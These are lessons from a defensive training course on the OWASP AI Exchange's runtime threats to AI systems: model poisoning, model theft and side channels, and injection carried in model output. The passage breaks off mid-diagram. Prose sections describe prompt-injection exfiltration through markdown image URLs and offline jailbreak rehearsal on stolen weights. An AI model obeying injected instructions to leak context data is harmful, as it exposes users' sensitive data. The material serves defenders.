Most of what can go wrong with a deployed AI system is not exotic adversarial machine learning — it is ordinary hacking with AI-shaped consequences. This lesson positions Section 4 of the AI Exchange inside the full threat landscape, then works through 4.1 Generic security threats: which conventional controls you must already have, which standards define them, and where AI forces you to pay special attention (cloud hosting, model access control, third-party monitoring).

An AI system is, before anything else, an IT system. At runtime it can be attacked with any conventional technique — for example, breaking into the application's user database. The AI Exchange deliberately does not re-teach conventional security: those attacks against generic assets, and their countermeasures, are covered in many other resources. Section 4 (permalink: owaspai.org/go/runtimeconventionalsec/) focuses only on what is AI-specific about conventional runtime attacks.

Where Section 4 sits in the threat landscape

The guide partitions its threat chapters by lifecycle phase and by how AI-specific the attack is:

  • Section 2 covers runtime attacks that are AI-specific: attacks performed through inference — by using the system and providing model input (prompt injection, evasion, model inversion, and so on).
  • Section 3 covers attacks during development-time: mostly conventional attacks (e.g. breaking into a training database) with sometimes AI-specific consequences (e.g. changing model behaviour), plus AI-specific supply chain attacks.
  • Section 4 — this module — covers conventional security attacks at runtime that have AI-specific consequences. Example: changing model behaviour by hacking into a runtime database of augmentation data (data that is added to the model input).
Where each threat chapter attacks the system
Section 2 — runtime, AI-specific (through use)
Attacker as usercrafts model input
Prompt injection / evasion / inversionabuse via inference
Section 3 — development-time
Attacker in the pipelinebreaks into dev environment / supply chain
Data / model poisoning, dev leaksconventional break-in, AI consequence
Section 4 — runtime, conventional (this module)
Attacker in productionbreaks into live system
Runtime poisoning, model/input/augmentation leaks, injectable outputconventional attack, AI-specific asset

The details of how these conventional attacks are performed, and in-depth coverage of controls against them, live in other resources. This section of the guide focuses on the AI-specific consequences and the categories of controls required — plus AI-specific aspects of those controls, such as the option of using a Trusted Execution Environment (TEE) for models (you will meet TEEs properly in lesson 2 and lesson 3).

The subsections of Section 4 cover: non-AI-specific threats (4.1), model poisoning (4.2), model leak (4.3), insecure output handling (4.4), leaking input data (4.5), and attacks on augmentation data (4.6–4.7). Here is the whole module at a glance:

Threat (§)AI-specific asset attackedImpactDedicated control(s)
4.1 Generic security threatsAll assets (generic)Confidentiality, integrity, availability of all assetsGovernance + conventional technical + operational controls (no # control of its own)
4.2 Direct runtime model poisoningModel parameters / model I/O logic in productionIntegrity breach — manipulated behaviour or denial of service#RUNTIME MODEL INTEGRITY, #RUNTIME MODEL IO INTEGRITY
4.3 Direct runtime model leakModel parameters in productionConfidentiality breach — IP theft, input-attack preparation#RUNTIME MODEL CONFIDENTIALITY, #MODEL OBFUSCATION (+ #MODEL WATERMARKING)
4.4 Output contains conventional injectionDownstream consumers of model outputInjection (e.g. XSS) executed when output is processed; data exfiltration#ENCODE MODEL OUTPUT
4.5 Input data leakModel input (e.g. GenAI prompts)Confidentiality breach of sensitive input#MODEL INPUT CONFIDENTIALITY
4.6 Direct augmentation data leakAugmentation data (RAG stores, system prompts, vectors)Confidentiality breach of augmentation data#AUGMENTATION DATA CONFIDENTIALITY
4.7 Augmentation data manipulationAugmentation data at rest / in transitIntegrity breach — manipulated model behaviour (like data poisoning)#AUGMENTATION DATA INTEGRITY
◆ Senior insight

Notice the design principle behind this chapter: same old attack, new asset. An attacker who steals model weights from a production disk used exactly the skills of any data-theft intrusion — but the consequence is AI-specific (a stolen oracle for crafting evasion and prompt-injection attacks offline). Your job as a security engineer is therefore not to invent new defences, but to make sure your existing appsec program has the AI assets — parameters, prompts, vectors, augmentation stores, output paths — on its asset inventory. Most real-world AI breaches to date exploited this gap, not novel ML mathematics.

THREAT
4.1 Generic security threatsConventional security threats can impact confidentiality, integrity and availability of all assets. Lifecycle: runtime. Maps to: classic OWASP Top 10 / ASVS territory.

4.1 Generic security threats

Impact: conventional security threats can impact confidentiality, integrity and availability of all assets. Permalink: owaspai.org/go/genericsecthreats/.

AI systems are IT systems and therefore can have security weaknesses and vulnerabilities that are not AI-specific — such as SQL injection. Such topics are covered in depth by many sources and are out of scope for the AI Exchange. One subtlety the guide flags: some controls in the AI Exchange itself are conventional security controls that are not AI-specific, but are applied to AI-specific threats — for example, monitoring to detect model attacks.

The three control categories for 4.1

1. Governance controls

See the Governance controls in the guide's general section — in particular SECDEVPROGRAM (a secure software development program) to attain application security, and SECPROGRAM (an information security management program) to attain information security in the organization. These are defined elsewhere in the guide; Section 4 leans on them repeatedly.

2. Technical conventional security controls

Useful standards include:

  • OpenCRE on technical conventional security controls — OpenCRE (Open Common Requirement Enumeration) is the cross-reference hub linking equivalent requirements across standards.
  • The ISO 27002 controls — but note the guide's caveat: they only partly cover technical conventional security controls, and at a high abstraction level.
  • More detailed and comprehensive control overviews: Common Criteria protection profiles (ISO/IEC 15408), with evaluation described in ISO 18045.
  • OWASP ASVS — the Application Security Verification Standard, the practical appsec requirements catalogue.

3. Operational security

When models are hosted by third parties, the security configuration of those services deserves special attention. Two AI-specific points the guide makes:

  • Model access control is part of this configuration and is an important mitigation for security risks — who and what may call the model at all.
  • Cloud AI configuration options deserve scrutiny — for example, opting out (when necessary) of monitoring by the third party, which could increase the risk of exposing sensitive data. The provider's own logging is a confidentiality liability for your prompts.

Useful standards: OpenCRE on operational security processes; again, ISO 27002 controls only partly cover operational security controls, at a high abstraction level.

⚠ Common misconception

"AI security" is often equated with prompt injection and jailbreaks. In reality, if your inference API sits behind a mis-scoped IAM role, or your vector database has no authentication (several popular vector stores shipped with auth disabled by default), an attacker never needs to touch the model's reasoning. Conventional weaknesses are the cheapest attack path — attacker economics always favour the unlocked door over the cleverly-worded prompt.

🛡 Defender's checklist
  • Confirm your SECDEVPROGRAM and SECPROGRAM explicitly include AI components (models, pipelines, vector stores) in scope.
  • Apply OWASP ASVS verification to the AI application layer like any other application.
  • For third-party-hosted models: review the security configuration, enable model access control, and read the fine print on provider-side monitoring — opt out where it creates data-exposure risk.
  • Put model parameters, prompts, augmentation data and output-handling paths on the formal asset inventory so CIA requirements get assigned.
  • Use OpenCRE to map your existing control set onto AI-specific gaps rather than building a parallel program.
Why does the AI Exchange bother having a "generic security threats" section if it declares conventional security out of scope?
Because completeness of the threat model demands it: a risk assessment of an AI system that only covered AI-specific threats would miss the majority of realistic attack paths. Section 4.1 anchors the reader to governance (SECDEVPROGRAM, SECPROGRAM), technical standards (OpenCRE, ISO 27002, ISO/IEC 15408 with ISO 18045 evaluation, OWASP ASVS) and operational security, and flags the AI-specific twists — model access control and cloud AI configuration — without duplicating existing appsec literature.
What is AI-specific about "operational security" in 4.1?
Two things: model access control as a named, important mitigation, and scrutiny of cloud AI configuration — including the option to opt out of third-party monitoring, since a provider logging your traffic can expose sensitive prompt data. The mechanics are conventional; the assets and configuration surfaces are AI-shaped.
§ Source & standards

Guide pp. 243–244; permalinks /go/runtimeconventionalsec/ and /go/genericsecthreats/. Standards named by the guide: OpenCRE (technical + operational), ISO 27002 (partial, high-level), ISO/IEC 15408 Common Criteria with ISO 18045 evaluation, OWASP ASVS. Added canon: this chapter corresponds to the NIST AI RMF Manage and Measure functions applied to conventional risk, and to ISO/IEC 27090 (draft guidance on security threats to AI systems), which builds on exactly this "AI extends appsec" framing.

Key Points

  • An AI system is an IT system: at runtime it is vulnerable to any conventional security attack, e.g. against the user database.
  • Section 2 = AI-specific runtime attacks through use; Section 3 = development-time attacks; Section 4 = conventional runtime attacks with AI-specific consequences.
  • Section 4 teaches AI-specific consequences and control categories, not conventional attack mechanics — those live in other resources.
  • 4.1 controls come in three layers: governance (SECDEVPROGRAM, SECPROGRAM), technical conventional controls (OpenCRE, ISO 27002 partially, ISO/IEC 15408 + ISO 18045, OWASP ASVS), and operational security.
  • For third-party-hosted models: model access control matters, and cloud AI configuration (including opting out of provider monitoring) deserves scrutiny.
  • Some AI Exchange controls are conventional controls applied to AI-specific threats — e.g. monitoring to detect model attacks.
  • The recurring AI-specific control aspect in Section 4 is the Trusted Execution Environment for models.
Module 12 · §4.2 · OWASP AI Exchange

Direct Runtime Model Poisoning

~11 minCovers guide pp. 245–246

Poisoning is usually taught as a training-time attack — but an attacker with a foothold in your production environment can skip training entirely and rewrite the model where it lives. This lesson covers direct runtime model poisoning and its two dedicated controls, #RUNTIME MODEL INTEGRITY and #RUNTIME MODEL IO INTEGRITY, and situates them inside the wider poisoning family.

THREAT
4.2 Direct runtime model poisoningManipulating live model parameters or the model's I/O logic to change behaviour or deny service. Lifecycle: runtime. Maps to: MITRE ATLAS AML.T0018 (Manipulate AI Model), conventional integrity attack.

The threat

Impact: see Broad model poisoning — the same end state as any poisoning: model behaviour the owner did not intend, from subtle bias to a backdoor to denial of service. Permalink: owaspai.org/go/runtimemodelpoison/. Category: runtime conventional security threat.

This threat involves manipulating the behaviour of the model by altering the parameters within the live system itself. Recall what parameters are: the regularities extracted during the training process, for the model to use in its task — such as neural network weights. If an attacker can write to the file, memory region, or artifact store holding those weights in production, they can change what the model does without ever touching the training pipeline.

There is a second variant the guide calls out: compromising the model's input or output logic can also change its behaviour or deny its service. You do not need to touch a single weight if you can sit between the application and the model — rewriting inputs before inference or outputs after it (a man-in-the-middle position on the model I/O path) achieves the same effect from the victim's point of view.

Two runtime paths to the same poisoned behaviour
Attackerfoothold in production
→
Parameter storageweights on disk / in memory
→
Manipulated model behaviouror denial of service
Attackerman-in-the-middle
→
Model I/O logicinput pre-processing / output path
→
Manipulated model behaviouror denial of service

How this differs from the rest of the poisoning family

The guide distinguishes four poisoning routes by where the manipulation happens. Keep this table in your head — exam questions and real triage both hinge on it:

Poisoning routeWhere the attacker actsWhat is manipulatedGuide section
Data poisoningDevelopment-time (or runtime-collected training data)Training data§3.1.1
Direct development-time model poisoningDevelopment environmentModel attributes: parameter storage, model replacement, malware via custom/lambda layers, weights/architecture, embedded deserialization attacks§3.1.2
Supply-chain model poisoningThird-party model supplier / transitThe supplied (pre-)trained model§3.1.3
Direct runtime model poisoningLive production systemParameters in the live system, or the model's input/output logic§4.2 (this lesson)
⚔ Attacker's view

Runtime poisoning is attractive when the training pipeline is well-guarded but production is soft — a common asymmetry, because ML teams harden CI/CD while inference boxes are treated as stateless app servers. Economics: a single write primitive on the model artifact (a compromised container image, a writable model registry bucket, an exposed weights volume) buys persistent, hard-to-attribute behaviour change. Unlike data poisoning, there is no retraining lag and no statistical trace in the training set — and unlike prompt injection, the change survives across all sessions until someone verifies the artifact. The I/O-logic variant is even cheaper: no ML knowledge needed at all, just a classic man-in-the-middle or code patch on the serving layer.

Controls

The guide prescribes the General controls plus the two dedicated controls below. Note their category: these are runtime information security controls against conventional security threats — conventional mechanisms pointed at an AI asset.

#RUNTIME MODEL INTEGRITYProtect the stored model parameters in productionruntime · infosec · conventional threats
IntentPrevent an attacker who reaches the production environment from silently altering model parameters — the weights that encode all learned behaviour. If the parameters cannot be modified (or modification is detected), path A of runtime poisoning is closed.
ImplementApply traditional conventional security controls to protect the storage of model parameters: access control, checksums, and encryption. A Trusted Execution Environment (TEE) can help to protect model integrity — the model executes inside a hardware-isolated enclave that the host OS and co-tenant processes cannot write into.
LimitsChecksums only help if something verifies them on load and on a schedule — an unchecked hash is decoration. Encryption at rest does not stop an attacker who compromises the serving process itself (the key must be available at inference). TEEs add operational complexity, constrain hardware choice, and have measurable inference-performance cost — a judgment call driven by the model's value and the deployment's exposure.
StandardsPermalink: owaspai.org/go/runtimemodelintegrity/. Underlying mechanisms map to conventional integrity controls (ISO 27002 access control & cryptography themes, OWASP ASVS V1/V6 territory); attack side maps to MITRE ATLAS AML.T0018.
#RUNTIME MODEL IO INTEGRITYProtect the model's input/output path from tamperingruntime · infosec · conventional threats
IntentClose path B: stop runtime manipulation of the model's input/output logic. Even a perfectly intact model produces attacker-chosen results if its inputs are rewritten before inference or its outputs are rewritten after.
ImplementApply conventional security controls to protect against runtime manipulation of the model's I/O logic — e.g. protect against a man-in-the-middle attack: authenticated, encrypted channels (mutual TLS) between application and model service, integrity of the pre-/post-processing code, and hardening of every hop on the inference path.
LimitsChannel encryption protects data in motion but not a compromised endpoint: if the serving process or the pre-processing library itself is backdoored, TLS faithfully delivers tampered data. I/O integrity therefore depends on #RUNTIME MODEL INTEGRITY and supply-chain hygiene of the serving stack — the controls compose, none stands alone.
StandardsPermalink: owaspai.org/go/runtimemodeliointegrity/. Mechanisms are classic transport/endpoint integrity (ISO 27002 communications security; OWASP ASVS network/communications chapters).
◆ Senior insight

Ask "who would notice?" before "who could do it?". Runtime poisoning's real danger is dwell time: a 0.3% shift in a fraud model's threshold has no crash, no alert, no diff in git. That is why the guide pairs these integrity controls with #CONTINUOUS VALIDATION-style model performance monitoring elsewhere: cryptographic integrity tells you the artifact changed; behavioural validation tells you the model changed even when the artifact checks pass (e.g. the I/O path was patched instead). Budget for both signals.

🛡 Defender's checklist
  • Treat model weights as production code: signed artifacts, immutable storage, verified checksum on every load.
  • Restrict write access to model storage to the deployment pipeline identity only — no human standing write access.
  • Mutually authenticate and encrypt every hop between application and model service (kills the man-in-the-middle on I/O).
  • Consider a TEE where the model's integrity matters more than raw throughput.
  • Alert on any model-artifact mutation outside a deployment window; reconcile hashes against the registry of record.
An attacker cannot touch your model weights but controls a reverse proxy in front of the model service. Which variant of 4.2 is this, and which control addresses it?
This is the second variant: compromising the model's input/output logic — the weights are intact, but the attacker can rewrite requests and responses, changing effective behaviour or denying service. #RUNTIME MODEL IO INTEGRITY addresses it, via conventional protections against man-in-the-middle manipulation such as authenticated encrypted channels and hardening of the I/O path.
Why does the guide say the impact of 4.2 is "see Broad model poisoning"?
Because the consequence is identical regardless of route: the model exhibits behaviour its owner did not intend (bias, backdoors, wrong decisions, or unavailability). What distinguishes 4.2 is the attack surface — the live production system — not the impact. The routes differ in attacker prerequisites and in which controls interrupt them.
§ Source & standards

Guide p. 245; permalinks /go/runtimemodelpoison/, /go/runtimemodelintegrity/, /go/runtimemodeliointegrity/. Added canon: MITRE ATLAS AML.T0018 covers backdooring/manipulating an ML model artifact; NIST AI 100-2 treats poisoning taxonomy (its §2.3 for predictive AI). The training-time counterparts and their controls (#POISON ROBUST MODEL, #TRAIN ADVERSARIAL, #CONTINUOUS VALIDATION) are covered in the development-time module.

Key Points

  • Direct runtime model poisoning alters parameters inside the live system — no training pipeline involved.
  • Model parameters are the regularities extracted during training (e.g. neural network weights); write access to them is behaviour control.
  • The second variant compromises the model's input/output logic instead — same effect, achievable via man-in-the-middle, and can also deny service.
  • #RUNTIME MODEL INTEGRITY = conventional protection of parameter storage: access control, checksums, encryption; a TEE can help.
  • #RUNTIME MODEL IO INTEGRITY = conventional protection of the I/O path, e.g. against man-in-the-middle attacks.
  • Distinguish the four poisoning routes by where the attacker acts: training data, dev environment, supply chain, or live system.
  • Integrity controls detect artifact change; behavioural validation detects behaviour change — you need both signals.
Module 12 · §4.3 · OWASP AI Exchange

Direct Runtime Model Leak and Side-Channel Attacks

~14 minCovers guide pp. 246–248

Your model's parameters may be your company's most concentrated intellectual property — and, stolen, they become the attacker's private lab for perfecting attacks against you. This lesson covers direct runtime model leak, including side-channel attacks that leak the model without ever reading its files, and the two dedicated controls: #RUNTIME MODEL CONFIDENTIALITY and #MODEL OBFUSCATION.

THREAT
4.3 Direct runtime model leakStealing model parameters from a live system by breaking into it — including side-channel extraction. Lifecycle: runtime. Maps to: MITRE ATLAS exfiltration via cyber means (AML.T0025), LLM Top 10 supply/asset confidentiality concerns.

The threat and its double impact

Permalink: owaspai.org/go/runtimemodelleak/. Category: runtime conventional security threat.

Impact: confidentiality breach of the model (i.e. model parameters), which cuts two ways:

  1. Intellectual property theft — e.g. by a competitor who now owns what you paid to train.
  2. A launchpad for input attacks: with a copy of the model, the attacker can run input attacks against it circumventing your protections — rate limiting, access control, and detection mechanisms all live in your stack, not in the weights. This works for all input attacks that extract data, and for the preparation of evasion or prompt injection: experimenting offline to find attack inputs that work, then firing the polished attack at your production system in a handful of requests.
⚔ Attacker's view

A stolen model is an oracle with the alarm ripped out. Against your API, an attacker gets throttled, logged, and pattern-matched; against their local copy they get millions of free, invisible queries. This inverts the economics of every input attack: the expensive search phase (finding the adversarial example, tuning the jailbreak, probing what training data is memorised) happens where you cannot see it, and only the final, working input ever touches your telemetry. That is why model confidentiality is a force multiplier control — it protects every other runtime defence you have.

"Direct" — disambiguating three model-theft paths

The word direct is doing precise work. The guide separates three ways a model leaks:

PathMechanismLifecycle / attack surfaceGuide section
Direct runtime model leakBreak into the live system: gain access to executables, memory, or other storage/transfer of parameter data in the production environmentRuntime, conventional intrusion§4.3 (this lesson)
Model exfiltration (model theft through use)Steal the model through normal use over a number of steps — querying the API and training a replica on the responsesRuntime, through the inference interface§2 (threats through use)
Direct development-time model leakSteal model attributes from the development environment — insider access, compromised repositories, weak storage controlsDevelopment-time§3.2.2

Same asset, three attack surfaces, three different control sets. "Direct" means the attacker takes the parameters themselves rather than reconstructing the model from its answers.

Side-channel attacks: leaking a model without reading it

Section 4.3 explicitly includes side-channel attacks. Here the attacker does not necessarily steal the entire model; instead they extract specific details about the model's behaviour or internal state. The mechanism: observe physical or timing characteristics during inference —

  • response times,
  • power consumption,
  • electromagnetic emissions,

— and infer sensitive information from them. Such an attack can reveal the model's structure, the type of data it processes, or even specific parameter values, which may be leveraged for subsequent attacks or to replicate the model. The guide names DeepSniffer as a side-channel hardware attack of this kind: it reconstructs neural-network architecture by observing low-level hardware behaviour during inference.

Side-channel model extraction — no file access required
Model at inferencerunning on shared / observable hardware
→
Observablestiming · power · EM emissions
→
Attacker inferencee.g. DeepSniffer
→
Leaked internalsarchitecture · data types · parameter values

Risk identification: do you even have this threat?

The guide is unusually crisp here. This threat applies if:

  • the model represents intellectual property (i.e. a trade secret), or
  • the risk of any input attack applies —

with one clean exception: if the model is publicly available, there is no need to steal it, so the threat drops out of your risk register. Downloadable open-weights model? Spend your confidentiality budget elsewhere.

⚠ Common misconception

"We fine-tuned an open-source base model, so model theft doesn't apply to us." Wrong on both prongs: your fine-tuned weights encode proprietary data and behaviour (IP), and a copy of your exact deployed model — not the public base — is what lets an attacker rehearse evasion and prompt-injection attacks that transfer to your production system. The public-availability exception applies only when the deployed model itself is public.

Controls

The guide lists: General controls — especially Sensitive data limitation; #MODEL WATERMARKING (defined in the development-time section: embed a traceable mark so a stolen copy can be attributed and proven yours); and the two dedicated controls below.

#RUNTIME MODEL CONFIDENTIALITYKeep production model parameters secret — including from side channelsruntime · infosec · conventional threats
IntentDeny attackers the model parameters even after they reach the production environment, and deny side-channel observers useful signal. Protects both the IP value of the model and the effectiveness of all your input-attack defences.
ImplementSee SECDEVPROGRAM to attain conventional security, focused on protecting the storage of model parameters (e.g. access control, encryption). A Trusted Execution Environment (TEE) can be highly effective: it isolates model operations from potential threats — including side-channel hardware attacks like DeepSniffer — by ensuring sensitive computations occur within a secure enclave, reducing the risk of attackers gaining useful information through side-channel methods. Side-channel mitigation techniques: Masking — introduce random delays or noise during inference to obscure the relationship between input data and response times, complicating timing-based side-channel attacks (see 'Masking against Side-Channel Attacks: A Formal Security Proof'). Shielding — employ hardware-based shielding to prevent electromagnetic or acoustic leakage that might be exploited (see 'Electromagnetic Shielding for Side-Channel Attack Countermeasures').
LimitsEncryption at rest cannot protect parameters at inference time outside a TEE — the model must be decrypted to run. Masking trades latency and jitter for secrecy (it deliberately adds noise/delays). Shielding is a physical control: relevant for hardware you own or edge deployments, not something you can apply to a third-party cloud. TEEs constrain hardware and carry performance overhead. None of these stop model exfiltration through normal use — that is a different threat with different controls (rate limiting, monitoring).
StandardsPermalink: owaspai.org/go/runtimemodelconfidentiality/. Builds on SECDEVPROGRAM; conventional confidentiality mechanisms per ISO 27002 cryptography/access-control themes. Named references: DeepSniffer; masking and electromagnetic-shielding papers cited by the guide.
#MODEL OBFUSCATIONMake a stolen model hard to extract and understandruntime · infosec · conventional threats
IntentRaise the attacker's cost after a storage breach: even with access to runtime storage, the model should be difficult to extract and understand. Defence in depth behind #RUNTIME MODEL CONFIDENTIALITY.
ImplementTechniques to store the model in a complex and confusing way with minimal technical information — stripping metadata, transforming representations, and obscuring structure so the artifact does not hand the attacker a ready-to-run model. See the ModelObfuscator article referenced by the guide (an approach demonstrated for on-device ML models).
LimitsObfuscation is friction, not cryptography: a determined, resourced attacker with the full artifact and the runtime that executes it can eventually de-obfuscate — the device must be able to run the model, so all information needed to run it is present. Value is highest for widely distributed models (mobile/edge) where casual extraction is the realistic threat; it complements, never replaces, access control and encryption.
StandardsPermalink: owaspai.org/go/modelobfuscation/. Conceptually parallel to conventional software obfuscation guidance (e.g. OWASP MASVS resilience requirements for mobile).
◆ Senior insight

Sequence your spend by attacker position. Access control and encryption defeat the remote intruder; the TEE defeats the co-tenant and the compromised host; masking and shielding defeat the physical observer; obfuscation and watermarking are for after you have lost — one slows the attacker down, the other lets you prove the theft. A mature design states explicitly which of these positions are in its threat model: shielding a cloud-only SaaS model is wasted budget, while shipping an unobfuscated model to a mobile app is handing out weights.

How does a side-channel attack differ from model exfiltration through use?
Model exfiltration reconstructs the model from its input/output behaviour via the normal inference interface, over many queries. A side-channel attack observes physical/timing characteristics of the computation itself — response times, power consumption, electromagnetic emissions — to infer structure, processed data types, or parameter values, without necessarily using the model's answers at all and without stealing the whole model. The guide files side channels under direct runtime model leak (§4.3).
Your model is an open-weights model deployed unmodified. Does §4.3 apply?
No — the guide's risk identification carves this out: if the model is publicly available there is no need to steal it, so neither the IP-theft impact nor the attack-preparation impact adds risk (the attacker already has a perfect copy). The moment you fine-tune, the deployed model is no longer public and the threat returns.
Why does the guide list #MODEL WATERMARKING under a confidentiality threat when it doesn't prevent theft?
Watermarking is a detective/reactive control: it does not stop the leak, but it makes a stolen copy attributable — you can demonstrate a suspect model is yours, enabling legal and commercial response. It addresses the IP-theft impact after the fact, which is why it accompanies, rather than replaces, #RUNTIME MODEL CONFIDENTIALITY.
§ Source & standards

Guide pp. 246–248; permalinks /go/runtimemodelleak/, /go/runtimemodelconfidentiality/, /go/modelobfuscation/. Named: DeepSniffer; 'Masking against Side-Channel Attacks: A Formal Security Proof'; 'Electromagnetic Shielding for Side-Channel Attack Countermeasures'; ModelObfuscator. Added canon: MITRE ATLAS models this as exfiltration via cyber means (AML.T0025) versus exfiltration via the inference API (AML.T0024) — mirroring the guide's direct-vs-through-use split.

Key Points

  • Direct runtime model leak = stealing parameters from a live system by breaking in: executables, memory, or storage/transfer of parameter data in production.
  • Impact is double: IP theft, plus an offline oracle for preparing data-extraction, evasion, and prompt-injection attacks free of rate limiting, access control, and detection.
  • "Direct" distinguishes it from model exfiltration (theft through normal use) and from development-time model leak (different lifecycle/attack surface).
  • Side-channel attacks infer model structure, data types, or parameter values from response times, power consumption, or electromagnetic emissions — DeepSniffer is the named example.
  • #RUNTIME MODEL CONFIDENTIALITY: SECDEVPROGRAM-based conventional protection of parameter storage (access control, encryption); a TEE is highly effective, including against side-channel hardware attacks; masking and shielding mitigate timing and EM/acoustic channels respectively.
  • #MODEL OBFUSCATION: store the model in a complex, low-information way so an attacker with storage access still struggles to extract and understand it — friction, not cryptography.
  • Risk identification: threat applies if the model is a trade secret or any input attack applies — unless the model is publicly available.
  • #MODEL WATERMARKING complements these as an attribution control for stolen copies.
Module 12 · §4.4 · OWASP AI Exchange

Output Contains Conventional Injection

~10 minCovers guide pp. 248–249

Every appsec engineer knows to encode untrusted user input. The AI twist: the model itself is an untrusted author. Its text output can carry XSS, command payloads, or exfiltration URLs into any component that processes it. This lesson covers threat 4.4 and its control #ENCODE MODEL OUTPUT — the shortest control in the guide, guarding one of the most exploited weaknesses in deployed LLM applications.

THREAT
4.4 Output contains conventional injectionModel output carrying injection payloads (e.g. XSS) that fire when the output is processed — including data exfiltration via URLs. Lifecycle: runtime. Maps to: OWASP LLM05:2025 Improper Output Handling, MITRE ATLAS AML.T0051.

The threat

Permalink: owaspai.org/go/outputcontainsconventionalinjection/. Category: runtime conventional security threat.

Impact: textual model output may contain conventional injection attacks such as XSS (cross-site scripting), which create a vulnerability when the output is processed — e.g. shown on a website, or used to execute a command.

Mechanically, this is the standard output-encoding issue you already know from classic appsec — with one particularity: the untrusted content is produced by the AI. A model can emit <script> tags because a prompt-injection attacker asked it to, because retrieved augmentation data contained them, or simply because its training data taught it to write executable-looking text. If the consuming component (browser, shell, SQL layer, downstream agent) treats that text as code, the injection fires.

The exfiltration special form

A special form of this threat is using injectable output to exfiltrate data: for example, a model manipulated to output JavaScript code that is executed and sends sensitive data to a third party.

And a special sub-form: sensitive data packed into URLs in the output — for users to click on, or for images to retrieve. The guide is candid that by classic definitions this is not injection, but the spirit of the mechanism is, so it is in scope of this threat: the data gets 'executed' by a web request (HTTP) — either by an image being rendered in a browser, or by a user clicking a link.

Exfiltration via model output — the markdown-image pattern
Attackerindirect prompt injection in a document/page
→
Modelhas sensitive context: chat history, RAG data
→
Output with URLimage/link, secret encoded in the URL
→
